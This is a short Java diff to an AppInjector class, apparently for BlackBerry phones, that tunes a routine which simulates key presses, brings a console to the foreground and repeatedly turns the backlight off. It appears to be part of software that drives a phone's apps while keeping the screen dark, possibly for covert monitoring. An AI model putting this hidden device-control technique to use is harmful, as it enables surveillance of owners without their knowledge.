@@ -165,10 +165,13 @@ public class AppInjector {
     }
 
     private void unLock() {
-        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        Utils.sleep(100);
-        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        Utils.sleep(100);
+        manager.requestForegroundForConsole();
+        Utils.sleep(200);
+        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
+        //KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
+        //Utils.sleep(200);
+        //KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
+        Utils.sleep(200);
         if (Backlight.isEnabled()) {
             //#ifdef DEBUG
             debug.trace("Backlight still enabled, getHardwareLayout: "
@@ -178,11 +181,13 @@ public class AppInjector {
             KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
             KeyInjector.pressRawKeyCode(KEY_LOCK);
             Backlight.enable(false);
-
+            Utils.sleep(500);
             for (int i = 0; i < 20; i++) {
                 if (Backlight.isEnabled()) {
-                    Backlight.enable(false);
+                    //Backlight.enable(false);
                     Utils.sleep(500);
+                }else{
+                    break;
                 }
             }
 
